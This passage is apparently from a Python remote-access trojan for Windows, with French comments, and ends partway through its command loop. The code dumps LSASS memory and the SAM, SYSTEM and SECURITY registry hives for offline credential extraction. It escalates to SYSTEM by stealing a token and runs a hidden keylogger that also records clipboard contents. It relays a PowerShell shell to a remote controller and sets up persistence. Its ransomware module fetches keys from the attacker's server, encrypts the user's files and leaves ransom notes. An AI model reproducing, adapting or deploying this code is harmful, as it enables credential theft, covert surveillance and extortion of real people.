        stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW
    )
    s.send(b"[ADDSTARTUP] Startup entry added." + chariot + chariot)

# ============================================
# FONCTIONS - GESTION PROCESSUS
# ============================================

# Liste tous les processus en cours avec PID, nom et utilisateur
def Process_List():
    import psutil
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process_list.append({
            'PID': proc.info['pid'],
            'Name': proc.info['name'],
            'User': proc.info['username']
        })
    
    # Format with aligned columns
    header = f"{'PID':<10} {'Name':<50} {'User':<30}"
    process_list.append(header)
    
    lines = [header]
    for proc in process_list:
        if isinstance(proc, dict):
            line = f"{proc['PID']:<10} {proc['Name']:<50} {proc['User']:<30}"
            lines.append(line)
    
    process_info = "\n".join(lines)
    s.send(chariot + process_info.encode('utf-8') + chariot)

# Dump la mémoire d'un processus par PID (non implémenté)
def Dump_Process_Memory(pid):
    s.send(chariot + f"Dumping memory of process with PID {pid}... (Not implemented)".encode('utf-8') + chariot)

# ============================================
# FONCTIONS - CREDENTIAL DUMPING
# ============================================

# Récupère le PID du processus LSASS
def get_lsass_pid():
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'lsass.exe':
            return proc.info['pid']
    return None

# Dump complet de la mémoire LSASS pour extraction offline des credentials (mimikatz/pypykatz)
def Lsa_Dump():
    s.send(chariot + b"[LSADUMP] Dumping LSASS process...\n")
    
    try:
        import ctypes
        from ctypes import wintypes
        
        # CRITIQUE: Réappliquer l'impersonation SYSTEM sur ce thread
        if not Ensure_System_Privileges():
            s.send(b"[LSADUMP] WARNING: No SYSTEM token available.\n")
            s.send(b"[LSADUMP] Run 'getsystem' first for better success rate.\n")
        else:
            s.send(b"[LSADUMP] SYSTEM privileges applied to this thread.\n")

        # Confirm that we are SYSTEM

        Whoami()
        # Trouver le PID de LSASS
        pid = get_lsass_pid()
        if not pid:
            s.send(b"[LSADUMP] Could not find LSASS PID.\n" + chariot)
            return
        
        s.send(f"[LSADUMP] Found LSASS PID: {pid}\n".encode('utf-8'))
        
        # Ouvrir le processus avec tous les droits
        PROCESS_ALL_ACCESS = 0x1F0FFF
        kernel32 = ctypes.windll.kernel32
        dbghelp = ctypes.windll.dbghelp
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            s.send(b"[LSADUMP] Failed to open LSASS process.\n" + chariot)
            return
        
        # Créer le fichier dump
        dump_path = os.path.join(os.getcwd(), "lsass.dmp")
        h_file = kernel32.CreateFileW(
            dump_path,
            0x40000000,  # GENERIC_WRITE
            0,
            None,
            2,  # CREATE_ALWAYS
            0x80,  # FILE_ATTRIBUTE_NORMAL
            None
        )
        
        if h_file == -1:
            s.send(b"[LSADUMP] Failed to create dump file.\n" + chariot)
            kernel32.CloseHandle(h_process)
            return
        
        # Créer un dump mémoire complet du processus LSASS
        # MiniDumpWithFullMemory (0x02) : inclut toutes les sections mémoire accessibles
        # Cela capture les credentials en clair, tickets Kerberos, hashes NTLM, etc.
        # Le dump peut ensuite être parsé offline avec pypykatz ou mimikatz
        MiniDumpWithFullMemory = 0x00000002
        success = dbghelp.MiniDumpWriteDump(
            h_process,      # Handle du processus LSASS
            pid,            # PID du processus
            h_file,         # Handle du fichier de destination
            MiniDumpWithFullMemory,  # Type de dump (mémoire complète)
            None,           # Pas d'informations exception
            None,           # Pas d'informations utilisateur
            None            # Pas de callback
        )
        
        # Fermer les handles immédiatement pour libérer les ressources
        kernel32.CloseHandle(h_file)
        kernel32.CloseHandle(h_process)
        
        # Attendre que Windows libère complètement le fichier
        sleep(2)
        
        if success:
            s.send(f"[LSADUMP] LSASS dump created: {dump_path}\n".encode('utf-8'))
            s.send(b"[LSADUMP] Upload this file and parse with pypykatz or mimikatz offline.\n")
            s.send(b"[LSADUMP] Command: pypykatz lsa minidump lsass.dmp\n" + chariot)
            
            # Upload et suppression seulement si le dump a réussi
            try:
                #ZIP_Upload(dump_path)
                #sleep(1)
                #os.remove(dump_path)
                s.send(b"[LSADUMP] Dump file uploaded and removed.\n" + chariot)
            except Exception as cleanup_error:
                s.send(f"[LSADUMP] Cleanup error: {cleanup_error}\n".encode('utf-8') + chariot)
        else:
            s.send(b"[LSADUMP] MiniDumpWriteDump failed.\n" + chariot)

    except Exception as e:
        s.send(f"[LSADUMP] Error: {e}\n".encode('utf-8') + chariot)

# Exporte les ruches SAM, SYSTEM et SECURITY du registre pour extraction de hash offline
def Sam_Dump():
    s.send(chariot + b"[SAMDUMP] Dumping SAM database...\n")
    
    try:
        # Chemins temporaires pour les exports
        temp_dir = os.path.join(os.getcwd(), "sam_dump")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
        
        sam_path = os.path.join(temp_dir, "SAM")
        system_path = os.path.join(temp_dir, "SYSTEM")
        security_path = os.path.join(temp_dir, "SECURITY")
        
        s.send(b"[SAMDUMP] Exporting registry hives...\n")
        
        # Exporter la ruche SAM
        result_sam = subprocess.run(
            ["reg", "save", "HKLM\\SAM", sam_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_sam.returncode != 0:
            s.send(f"[SAMDUMP] Failed to save SAM: {result_sam.stderr}\n".encode('utf-8'))
            return
        
        s.send(b"[SAMDUMP] SAM hive exported.\n")
        
        # Exporter la ruche SYSTEM
        result_system = subprocess.run(
            ["reg", "save", "HKLM\\SYSTEM", system_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_system.returncode != 0:
            s.send(f"[SAMDUMP] Failed to save SYSTEM: {result_system.stderr}\n".encode('utf-8'))
            return
        
        s.send(b"[SAMDUMP] SYSTEM hive exported.\n")
        
        # Exporter la ruche SECURITY (optionnel, pour LSA secrets)
        result_security = subprocess.run(
            ["reg", "save", "HKLM\\SECURITY", security_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=CREATE_NO_WINDOW
        )
        
        if result_security.returncode == 0:
            s.send(b"[SAMDUMP] SECURITY hive exported.\n")
        
        s.send(b"[SAMDUMP] Registry hives exported successfully!\n")
        s.send(f"[SAMDUMP] Files saved in: {temp_dir}\n".encode('utf-8'))
        s.send(b"[SAMDUMP] Upload these files and parse offline with:\n")
        s.send(b"[SAMDUMP]   - impacket-secretsdump -sam SAM -system SYSTEM LOCAL\n")
        s.send(b"[SAMDUMP]   - pypykatz registry --sam SAM system SYSTEM\n")
        s.send(b"[SAMDUMP]   - mimikatz: lsadump::sam /sam:SAM /system:SYSTEM\n" + chariot)
        
        ZIP_Upload(temp_dir)
        sleep(1)
        shutil.rmtree(temp_dir, ignore_errors=True)
    except Exception as e:
        s.send(f"[SAMDUMP] Error: {e}\n".encode('utf-8') + chariot)


def Enable_All_Privileges():
    s.send(chariot + b"[GETPRIVS] Attempting to enable all privileges...\n")
    try:
        import win32security
        import win32api
        import win32con
        
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
        )
        
        all_tokens = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
        
        enabled_count = 0
        failed_count = 0
        
        s.send(chariot)
        for token in all_tokens:
            luid = token[0]
            priv_status = token[1]
            
            # Convertir LUID en nom de privilège
            try:
                priv_name = win32security.LookupPrivilegeName(None, luid)
            except Exception:
                priv_name = f"Unknown_LUID_{luid}"
            
            if priv_status == win32security.SE_PRIVILEGE_ENABLED:
                continue
            
            
            try:
                privilege = [(luid, win32security.SE_PRIVILEGE_ENABLED)]
                win32security.AdjustTokenPrivileges(hToken, False, privilege)
                enabled_count += 1
                s.send(f"[GETPRIVS] Enabled: {priv_name}\n".encode('utf-8'))
            except Exception as e:
                failed_count += 1
                s.send(f"[GETPRIVS] Failed: {priv_name} - {e}\n".encode('utf-8'))
        
        if enabled_count > 0:
            s.send(chariot + f"[GETPRIVS] Successfully enabled {enabled_count} privilege(s).\n".encode('utf-8') + chariot)
        if failed_count > 0:
            s.send(chariot + f"[GETPRIVS] Failed to enable {failed_count} privilege(s).\n".encode('utf-8') + chariot)
        
    except Exception as e:
        s.send(chariot + f"[GETPRIVS] Error: {e}\n".encode('utf-8') + chariot)

def Get_System():
    s.send(chariot + b"[GETSYSTEM] Attempting privilege escalation to SYSTEM...\n")
    
    if platform.system() != "Windows":
        s.send(chariot + b"[GETSYSTEM] Only available on Windows." + chariot)
        return
        
    try:
        import win32con, win32api, win32security, pywintypes
        import psutil
        
        # ÉTAPE 1: Activer SeDebugPrivilege ET SeImpersonatePrivilege
        s.send(b"[GETSYSTEM] Enabling required privileges...\n")
        try:
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
            )
            
            # Activer SeDebugPrivilege
            luid_debug = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
            privilege_debug = [(luid_debug, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, privilege_debug)
            s.send(b"[GETSYSTEM] SeDebugPrivilege enabled.\n")
            
            # Activer SeImpersonatePrivilege
            luid_impersonate = win32security.LookupPrivilegeValue(None, "SeImpersonatePrivilege")
            privilege_impersonate = [(luid_impersonate, win32security.SE_PRIVILEGE_ENABLED)]
            win32security.AdjustTokenPrivileges(hToken, False, privilege_impersonate)
            s.send(b"[GETSYSTEM] SeImpersonatePrivilege enabled.\n")
            
            hToken.Close()
            
        except Exception as e:
            s.send(chariot + f"[GETSYSTEM] WARNING: Could not enable privileges: {e}\n".encode('utf-8'))
        
        # ÉTAPE 2: Chercher un processus SYSTEM accessible
        system_processes = ["winlogon.exe", "services.exe", "wininit.exe", "lsass.exe", "csrss.exe"]
        system_pid = None
        found_process_name = None
        
        s.send(chariot + b"[GETSYSTEM] Searching for accessible SYSTEM process...\n")
        
        system_candidates = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                proc_name = proc.info['name'].lower() if proc.info['name'] else ""
                proc_user = proc.info['username']
                
                if proc_name in system_processes:
                    if proc_user is None:
                        system_candidates.append((proc.info['pid'], proc.info['name'], "Protected/SYSTEM"))
                    else:
                        proc_user_upper = proc_user.upper()
                        is_system = any([
                            "SYSTEM" in proc_user_upper,
                            "SYSTÈME" in proc_user_upper,
                            "AUTORITE NT" in proc_user_upper,
                            "NT AUTHORITY" in proc_user_upper
                        ])
                        
                        if is_system:
                            system_candidates.append((proc.info['pid'], proc.info['name'], proc_user))
                            
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        if not system_candidates:
            s.send(chariot + b"[GETSYSTEM] ERROR: No SYSTEM process found.\n" + chariot)
            return
        
        for pid, name, user in system_candidates:
            
            try:
                hProcess = win32api.OpenProcess(
                    win32con.PROCESS_QUERY_INFORMATION,
                    False,
                    pid
                )
                
                hToken = win32security.OpenProcessToken(
                    hProcess,
                    win32con.TOKEN_DUPLICATE | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_QUERY
                )
                
                system_pid = pid
                found_process_name = name
                s.send(f"[GETSYSTEM] SUCCESS: Opened {name} (PID: {pid})\n".encode('utf-8'))
                break
                
            except pywintypes.error as e:
                continue
        
        if not system_pid:
            s.send(chariot + b"[GETSYSTEM] ERROR: All SYSTEM processes are protected.\n" + chariot)
            return
        
        # ÉTAPE 5: Dupliquer le token SYSTEM avec tous les droits
        s.send(chariot + b"[GETSYSTEM] Duplicating SYSTEM token...\n")
        dupToken = win32security.DuplicateTokenEx(
            hToken,
            win32security.SecurityImpersonation,
            win32con.TOKEN_ALL_ACCESS,  # Tous les droits pour réutilisation
            win32security.TokenImpersonation,
            None
        )
        
        # ÉTAPE 6: Stocker le token globalement pour réutilisation
        global system_token, system_process_handle
        system_token = dupToken
        system_process_handle = hProcess
        
        # ÉTAPE 7: Impersonner le token SYSTEM sur le thread actuel
        s.send(b"[GETSYSTEM] Impersonating SYSTEM token...\n")
        win32security.ImpersonateLoggedOnUser(system_token)
        
        # ÉTAPE 8: Vérification
        s.send(b"[GETSYSTEM] Verifying impersonation...\n")
        
        # Nettoyer uniquement le handle de token source (pas le dupToken ni hProcess)
        hToken.Close()
        
        s.send(chariot + b"[GETSYSTEM] *** SUCCESS! ***\n")
        s.send(f"[GETSYSTEM] Impersonated SYSTEM token from: {found_process_name} (PID: {system_pid})\n".encode('utf-8'))
        s.send(b"[GETSYSTEM] Token SYSTEM saved globally for reuse.\n")
        s.send(b"[GETSYSTEM] All sensitive operations will now use SYSTEM privileges.\n" + chariot)
        
    except ImportError:
        s.send(chariot + b"[GETSYSTEM] ERROR: pywin32 and psutil required.\n" + chariot)
    except pywintypes.error as e:
        s.send(chariot + f"[GETSYSTEM] Windows API Error: {e}\n".encode('utf-8') + chariot)
    except Exception as e:
        s.send(chariot + f"[GETSYSTEM] Error: {e}\n".encode('utf-8') + chariot)

def Whoami():
    s.send(chariot + b"[WHOAMI] Retrieving current user information...\n")

    if not Ensure_System_Privileges():
        s.send(b"[WHOAMI] WARNING: No SYSTEM token available.\n")
        s.send(b"[WHOAMI] Run 'getsystem' first for better success rate.\n")
    else:
        s.send(b"[WHOAMI] SYSTEM privileges applied to this thread.\n")

    try:
        import win32api, win32security, win32con

        username = win32api.GetUserName()
        s.send(f"[WHOAMI] Current User: {username}\n".encode('utf-8'))

        # Essayer d'abord le token du thread (si impersonné), sinon celui du processus
        try:
            hToken = win32security.OpenThreadToken(
                win32api.GetCurrentThread(),
                win32con.TOKEN_QUERY,
                True  # OpenAsSelf
            )
        except:
            # Pas de token thread, utiliser le token processus
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_QUERY
            )
        
        token_user = win32security.GetTokenInformation(hToken, win32security.TokenUser)
        user_sid = token_user[0]
        sid_str = win32security.ConvertSidToStringSid(user_sid)
        s.send(f"[WHOAMI] User SID: {sid_str}\n".encode('utf-8'))

        # Obtenir le format DOMAIN\Username avec LookupAccountSid
        try:
            account_name, domain_name, account_type = win32security.LookupAccountSid(None, user_sid)
            full_name = f"{domain_name}\\{account_name}"
            s.send(f"[WHOAMI] Full Name: {full_name}\n".encode('utf-8'))
        except Exception:
            pass  # LookupAccountSid peut échouer dans certains contextes
        
        # Vérification SYSTEM par SID
        if sid_str == "S-1-5-18":
            s.send(b"[WHOAMI] *** CONFIRMED: Running as NT AUTHORITY\\SYSTEM ***\n" + chariot)

        hToken.Close()
    except Exception as e:
        s.send(f"[WHOAMI] Error: {e}\n".encode('utf-8'))

def Ensure_System_Privileges():
    """
    Réapplique l'impersonation SYSTEM au thread actuel.
    À appeler au début de toute fonction nécessitant des privilèges SYSTEM.
    Retourne True si SYSTEM, False sinon.
    """
    global system_token
    
    if system_token is None:
        return False
    
    try:
        import win32security
        # Réappliquer l'impersonation sur ce thread
        win32security.ImpersonateLoggedOnUser(system_token)
        return True
    except Exception:
        return False
            

def StartKeyLogger():
    s.send(chariot + b"[KEYLOGGER] Starting Keylogger...")
    keylogger_thread = threading.Thread(target=KeyLogger, name="KeyloggerThread", daemon=True)
    keylogger_thread.start()

def KeyLogger():
    s.send(b"[KEYLOGGER] Keylogger is running." + chariot + chariot)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not stop_event.is_set():
            listener.join(0.1)

def StopKeyLogger():
    s.send(chariot + b"[KEYLOGGER] Stopping Keylogger..." + chariot + chariot)
    stop_event.set()
    for thread in threading.enumerate():
        if thread.name == "KeyloggerThread":
            thread.join()
            print("[KEYLOGGER] Keylogger stopped.")

def on_press(key):
    pressed_keys.add(key)
    if not os.path.exists(AppData_Path_Keylog):
        os.makedirs(AppData_Path_Keylog)
        if not os.path.exists(AppData_Path_Keylog_File):
            with open(AppData_Path_Keylog_File, 'w', encoding='utf-8') as f:
                pass
        ctypes.windll.kernel32.SetFileAttributesW(AppData_Path_Keylog_File, 0x02)
    with open(AppData_Path_Keylog_File, 'a', encoding='utf-8') as logkey:
        if hasattr(key, 'char') and key.char is not None:
            code = ord(key.char)
            if code == 22 and any(k in pressed_keys for k in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r)):
                clipboard_content = paste()
                letter = chr(code + 64)
                logkey.write(f'[CTRL+{letter}: {clipboard_content}]')
            elif 1 <= code <= 26 and any(k in pressed_keys for k in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r)):
                letter = chr(code + 64)
                logkey.write(f'[CTRL+{letter}]')
            elif key.char.isalpha() and any(k in pressed_keys for k in (keyboard.Key.shift, keyboard.Key.shift_r)):
                logkey.write(f'[SHIFT+{key.char.upper()}]')
            elif key.char.isalpha() and any(k in pressed_keys for k in (keyboard.Key.alt, keyboard.Key.alt_gr)):
                logkey.write(f'[SHIFT+{key.char.upper()}]')
            else:
                logkey.write(key.char)
        elif key not in modifier_keys:
            if key == keyboard.Key.space:
                logkey.write(" ")
            elif key == keyboard.Key.enter:
                logkey.write("\n")
            elif key == keyboard.Key.backspace:
                RemoveLastChar(AppData_Path_Keylog_File)
            elif isinstance(key, keyboard.Key):
                logkey.write(f'[{key.name.upper()}]')
            else:
                logkey.write(f'[KEY: {key}]')

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def RemoveLastChar(AppData_Path_Keylog_File):
    with open(AppData_Path_Keylog_File, "r+") as f:
        f.seek(0, os.SEEK_END)
        pos = f.tell()
        if (pos > 0):
            f.seek(pos - 1)
            f.truncate()

def Open_PowerShell():
    s.send(chariot + b"[POWERSHELL] Opening PowerShell terminal..." + chariot + chariot)

    # Répertoire de travail courant de la session "emulée"
    ps_cwd = os.getcwd()


    try:
        proc = subprocess.Popen(
            ["powershell", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            bufsize=0,
            universal_newlines=False,  # on travaille en bytes
            creationflags=CREATE_NO_WINDOW
        )
        global powershell_proc 
        powershell_proc = proc
    except Exception as e:
        s.send(f"[POWERSHELL] Erreur: {e}\n".encode('utf-8'))
        return

    stop_evt = threading.Event()

    def pump_stdout():
        try:
            while not stop_evt.is_set():
                chunk = proc.stdout.read(1024)
                if not chunk:
                    break
                try:
                    s.send(chunk)
                except Exception:
                    break
        except Exception:
            pass

    t_out = threading.Thread(target=pump_stdout, daemon=True)
    t_out.start()

    

    try:
        while True:
            if proc.poll() is not None:
                break

            raw = s.recv(4096)
            if not raw:
                sleep(0.05)
                continue

            cmd = raw.decode('utf-8', errors='replace').strip()
            if cmd == "":
                
                continue

            lower = cmd.lower()

            # Commandes personnalisées
            if lower in ('exit', 'exit()', 'quit'):
                try:
                    proc.stdin.write(b"exit\r\n")
                    proc.stdin.flush()
                except Exception:
                    pass
                proc.wait(timeout=3)
                break
            elif cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:].strip())
                    ps_cwd = os.getcwd()
                except FileNotFoundError as e:
                    s.send(f"[POWERSHELL] Error: {e}\n".encode())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "clear":
                Clear_Screen()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "sysinfo":
                Get_SysInfo()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("read "):
                Read_File(cmd[5:].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("netstat"):
                if cmd == "netstat":
                    NetStat("inet")
                else:
                    kind = cmd.split(" ")[1].strip()
                    NetStat(kind)
                s.send(chariot + chariot)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("download "):
                filename = cmd[9:].strip()
                Download_File(filename)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("upload "):
                filepath = cmd[7:].strip()
                Upload_File(filepath)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("zipupload "):
                directory = cmd[10:].strip()
                ZIP_Upload(directory)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "addschedule":
                Add_Scheduled()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "addstartup":
                Add_Startup()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("search "):
                args = cmd[7:].strip().split(" ", 1)
                if len(args) == 2:
                    Search_File(args[0], args[1])
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "getscreen":
                Take_Screenshot(AppData_Path_Screen)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("loadmodule "):
                Load_Module(cmd[len("loadmodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("removemodule "):
                Remove_Module(cmd[len("removemodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("runmodule "):
                Run_Module(cmd[len("runmodule "):].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "startkeylogger":
                StartKeyLogger()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "stopkeylogger":
                StopKeyLogger()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "ps":
                Process_List()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd.startswith("dump "):
                Dump_Process_Memory(cmd[5:].strip())
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "hashdump":
                HashDump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "lsadump":
                Lsa_Dump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "samdump":
                Sam_Dump()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "getprivs":
                Enable_All_Privileges()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif cmd == "getsystem":
                Get_System()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "whoami":
                Whoami()
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif (cmd.startswith("startransom")):
                if cmd == "startransom":
                    user = getpass.getuser()
                    path_to_files = "C:\\Users\\" + user
                    Start_Ransomware(path_to_files)
                elif cmd.startswith("startransom "):
                    path_to_files = cmd[len("startransom "):].strip()
                    Start_Ransomware(path_to_files)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif (cmd.startswith("stopransom")):
                if cmd == "stopransom":
                    user = getpass.getuser()
                    path_to_files = "C:\\Users\\" + user
                    Stop_Ransomware(path_to_files)
                elif cmd.startswith("stopransom "):
                    path_to_files = cmd[len("stopransom "):].strip()
                    Stop_Ransomware(path_to_files)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue
            elif lower == "help":
                s.send(chariot + help_menu.encode('utf-8') + chariot)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
                continue

            # Si ce n'est pas une commande custom → envoyer à PowerShell
            norm = cmd.replace('\r\n', '\n').replace('\r', '\n').replace('\n', '\r\n').encode('utf-8', 'replace')
            try:
                proc.stdin.write(norm)
                proc.stdin.write(b"\r\n")
                proc.stdin.flush()
            except BrokenPipeError:
                break
            except Exception:
                pass

            

    finally:
        stop_evt.set()
        try:
            t_out.join(timeout=1.0)
        except Exception:
            pass
        try:
            if proc.poll() is None:
                proc.terminate()
        except Exception:
            pass

    s.send(b"\n[POWERSHELL] Session interactive terminee.\n" + chariot)

def KeyGen():
    keygenurl = f"http://{myip}/ransomware/ransomware.php"
    id = random.randint(100000, 999999)
    params = {"id": id}
    req = requests.get(keygenurl, params=params)
    k = req.text.strip().encode("utf-8")
    h_fernet = Fernet(k)
    return h_fernet, id

def Encrypt(path, h_fernet):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = h_fernet.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)
                os.rename(file_path, file_path + '.getcrypted')
            except PermissionError:
                pass

def Store_Id(path, id):  
    # Store ID in separate file
    with open(os.path.join(path, 'id.txt'), 'w') as f:
        f.write(str(id))
    
    # Store key in separate file
    #with open(os.path.join(path, 'key.txt'), 'wb') as f:
    #    f.write(key)

def Display_Ransom_Note(path):
    ransom_note = f"""
    Your files have been encrypted!
    
    To decrypt your files, you need to pay a ransom.
    
    Contact us with your ID to get the decryption key.
    
    ID file is located at: {os.path.join(path, 'id.txt')}
    
    Failure to comply will result in permanent loss of your data.
    """
    for root, dirs, files in os.walk(path):
        with open(os.path.join(root, 'RANSOM_NOTE.txt'), 'w') as f:
            f.write(ransom_note)

def Start_Ransomware(path_to_files):
    s.send(chariot + b"[RANSOMWARE] Starting ransomware encryption...\n")
    h_fernet, id = KeyGen()
    Encrypt(path_to_files, h_fernet)
    Store_Id(path_to_files, id)
    Display_Ransom_Note(path_to_files)
    s.send(b"[RANSOMWARE] Encryption complete. Ransom note created.\n" + chariot)

def Get_Id(path):
    with open(os.path.join(path, 'id.txt'), 'r') as f:
        id = f.read()
    keygenurl = f"http://{myip}/ransomware/getid.php"
    params = {"getkey": id}
    req = requests.get(keygenurl, params=params)
    k = req.text.strip().encode("utf-8")
    h_fernet = Fernet(k)
    
    return h_fernet, id

def Decrypt(path, h_fernet):
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith('.getcrypted'):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                basename, extension = os.path.splitext(file_path)
                decrypted_data = h_fernet.decrypt(encrypted_data)
                with open(os.path.join(root, basename), 'wb') as f:
                    f.write(decrypted_data)
                os.remove(file_path)

def Delete_Ransom_Note(path):
    for root, dirs, files in os.walk(path):
        ransom_note_path = os.path.join(root, 'RANSOM_NOTE.txt')
        if os.path.exists(ransom_note_path):
            os.remove(ransom_note_path)

def Delete_Key_Id_Files(path):
    id_path = os.path.join(path, 'id.txt')
    if os.path.exists(id_path):
        os.remove(id_path)

def Delete_In_Server(id):
    deleteurl = f"http://{myip}/ransomware/deleteid.php"
    params = {"deleteid": id}
    req = requests.get(deleteurl, params=params)


def Stop_Ransomware(path_to_files):
    s.send(chariot + b"[RANSOMWARE] Starting ransomware decryption...\n")
    h_fernet, id = Get_Id(path_to_files)
    Decrypt(path_to_files, h_fernet)
    Delete_Ransom_Note(path_to_files)
    Delete_Key_Id_Files(path_to_files)
    Delete_In_Server(id)
    s.send(b"[RANSOMWARE] Decryption complete. Ransom note removed.\n" + chariot)



while True:
    cwd = os.getcwd()
    s.send(f'[NATIVE] {cwd} - $ '.encode())
    command = s.recv(1024).decode('utf-8')
    if (command == 'exit\n'):
        break
    elif command.startswith('cd '):
        try:
            command = command.strip()
            os.chdir(command[3:])
        except FileNotFoundError as e:
            s.send(f'Error: {str(e)}\n'.encode())
    elif (command == "clear\n"):
        Clear_Screen()
    elif (command == "sysinfo\n"):
        Get_SysInfo()
    elif (command.startswith("read ")):
        filepath = command[5:].strip()
        Read_File(filepath)
    elif (command.startswith("netstat")):
        if (command == "netstat\n"):
            NetStat("inet")
            s.send(chariot + chariot)
        elif (command.startswith("netstat ")):
            kind = command.split(" ")[1].strip()
            NetStat(kind)
            s.send(chariot + chariot)
    elif command.startswith("download "):
        filename = command[9:].strip()
        Download_File(filename)
    elif command.startswith("upload "):
        filepath = command[7:].strip()
        Upload_File(filepath)
    elif command.startswith("zipupload "):
        directory = command[10:].strip()
        ZIP_Upload(directory)
    elif (command == "addschedule\n"):
        Add_Scheduled()
    elif (command == "addstartup\n"):
        Add_Startup()
    elif (command.startswith("search ")):
        args = command[7:].strip().split(" ", 1)
        pathtosearch = args[0]
        filedirname = args[1]
        Search_File(pathtosearch, filedirname)
    elif (command == "getscreen\n"):
        Take_Screenshot(AppData_Path_Screen)
    elif (command.startswith("loadmodule ")):
        module_name = command[len("loadmodule "):].strip()
        Load_Module(module_name)
    elif (command.startswith("removemodule ")):
        module_name = command[len("removemodule "):].strip()
        Remove_Module(module_name)
    elif (command.startswith("runmodule ")):
        module_name = command[len("runmodule "):].strip()
        Run_Module(module_name)
    elif (command == "startkeylogger\n"):
        StartKeyLogger()
    elif (command == "stopkeylogger\n"):
        StopKeyLogger()
    elif (command == "ps\n"):
        Process_List()
    elif (command.startswith("dump ")):
        pid = command[5:].strip()
        Dump_Process_Memory(pid)
    elif (command == "hashdump\n"):
        HashDump()
    elif (command == "lsadump\n"):
        Lsa_Dump()
    elif (command == "samdump\n"):
        Sam_Dump()
    elif (command == "getprivs\n"):
        Enable_All_Privileges()
    elif (command == "getsystem\n"):
        Get_System()
    elif (command == "whoami\n"):
        Whoami()
    elif (command == "powershell\n"):
        Open_PowerShell()
    elif (command == "cmd\n"):
        Open_CMD()
    elif (command.startswith("startransom")):
        if (command == "startransom\n"):
            user = getpass.getuser()
            path_to_files = "C:\\Users\\" + user
            Start_Ransomware(path_to_files)
        elif (command.startswith("startransom ")):
            path_to_files = command[len("startransom "):].strip()
            Start_Ransomware(path_to_files)
    elif (command.startswith("stopransom")):
        if (command == "stopransom\n"):
            user = getpass.getuser()
            path_to_files = "C:\\Users\\" + user
            Stop_Ransomware(path_to_files)
        elif (command.startswith("stopransom ")):
            path_to_files = command[len("stopransom "):].strip()
            Stop_Ransomware(path_to_files)
    elif (command == "help\n"):
